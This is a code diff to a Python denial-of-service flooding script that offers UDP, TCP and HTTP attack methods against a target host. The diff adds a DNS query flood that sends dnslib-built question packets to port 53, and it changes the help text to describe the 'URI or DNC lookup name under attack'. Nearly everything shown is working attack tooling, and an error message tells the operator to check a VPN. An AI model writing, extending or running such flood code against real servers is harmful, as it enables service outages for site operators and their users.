@@ -2,6 +2,7 @@ from optparse import OptionParser
 import time, sys, socket, threading, random, string
 import urllib.request
 import ssl
+from dnslib import DNSRecord
 
 
 def user_agent():
@@ -53,16 +54,21 @@ def down_it_udp():
             extra_data = get_random_string(0, 1000)
         else:
             extra_data = ''
-        packet = ("GET / HTTP/1.1"
-                  + "\nHost: " + host
-                  + "\nUser-Agent: " + random.choice(uagent)
-                  + data
-                  + "\n\n" + extra_data)
+        if port == 53:
+            query = DNSRecord.question(resource)
+            packet = bytes(query.pack())
+        else:
+            packet = ("GET / HTTP/1.1"
+                      + "\nHost: " + host
+                      + "\nUser-Agent: " + random.choice(uagent)
+                      + data
+                      + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.settimeout(5)
         p = int(port) if port else get_random_port()
         try:
-            s.sendto(packet.encode('utf-8'), (host, p))
+
+            s.sendto(packet, (host, p))
         except socket.gaierror:
             print("\033[91m Can't get server IP. Packet sending failed. Check your VPN.\033[0m")
         except BaseException as e:
@@ -176,7 +182,7 @@ def usage():
 	-t : -threads default 100
 	-m : -method default udp (udp/tcp/http)
 	-d : -debug debug error messages
-    --resource : -api-host under attack\033[0m ''')
+    --resource : URI or DNC lookup name under attack\033[0m ''')
     sys.exit()
 
 
@@ -201,7 +207,7 @@ def get_parameters():
                     help="Debug error messages")
     optp.add_option("-m", "--method", type="str", dest="attack_method",
                     help="Attack method: udp (default), tcp, http")
-    optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default="/")
+    optp.add_option('--resource', type='str', dest='resource', help='URI or DNC lookup name under attack.', default="/")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
